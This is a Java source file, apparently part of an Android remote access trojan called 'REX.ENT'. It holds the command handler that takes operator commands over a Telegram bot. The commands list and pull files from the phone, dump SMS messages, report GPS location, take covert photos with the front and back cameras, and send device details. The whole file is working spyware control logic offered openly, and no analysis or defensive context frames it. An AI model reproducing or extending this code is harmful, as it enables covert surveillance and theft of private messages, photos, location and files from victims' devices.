package com.enterprise.rat.commands;

import android.content.Context;
import com.enterprise.rat.bot.BotConfig;
import com.enterprise.rat.utils.TelegramApi;
import com.google.gson.JsonObject;

public class CommandHandler {
    private Context context;
    private FileManager fileManager;
    private SMSManager smsManager;
    private LocationManager locationManager;
    private CameraManager cameraManager;
    private DeviceInfoManager deviceInfoManager;

    public CommandHandler(Context context) {
        this.context = context;
        this.fileManager = new FileManager(context);
        this.smsManager = new SMSManager(context);
        this.locationManager = new LocationManager(context);
        this.cameraManager = new CameraManager(context);
        this.deviceInfoManager = new DeviceInfoManager(context);
    }

    public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
        String[] args = text.split(" ");
        String cmd = args[0].toLowerCase();

        switch (cmd) {
            case "/start":
                TelegramApi.sendMessage("<b>⚡ REX.ENT Online</b>\nID: <code>" + BotConfig.SESSION_ID + "</code>\nType /help for commands.");
                break;
            case "/info":
                deviceInfoManager.sendDeviceInfo();
                break;
            case "/ls":
                String path = args.length > 1 ? args[1] : "/sdcard";
                fileManager.listDirectory(path);
                break;
            case "/download":
                if (args.length > 1) fileManager.uploadFile(args[1]);
                break;
            case "/sms_list":
                int limit = args.length > 1 ? Integer.parseInt(args[1]) : 10;
                smsManager.sendSMSList(limit);
                break;
            case "/location":
                locationManager.sendCurrentLocation();
                break;
            case "/photo_front":
                cameraManager.takePhoto(1);
                break;
            case "/photo_back":
                cameraManager.takePhoto(0);
                break;
            case "/help":
                sendHelp();
                break;
            default:
                // Handle custom or unrecognized commands
                break;
        }
    }

    private void sendHelp() {
        String help = "<b>🛠 Command List:</b>\n" +
                "<code>/info</code> - Device Details\n" +
                "<code>/ls [path]</code> - List Files\n" +
                "<code>/download [file]</code> - Get File\n" +
                "<code>/sms_list [n]</code> - Get SMS\n" +
                "<code>/location</code> - Get GPS\n" +
                "<code>/photo_front</code> - Front Cam\n" +
                "<code>/photo_back</code> - Back Cam";
        TelegramApi.sendMessage(help);
    }
}
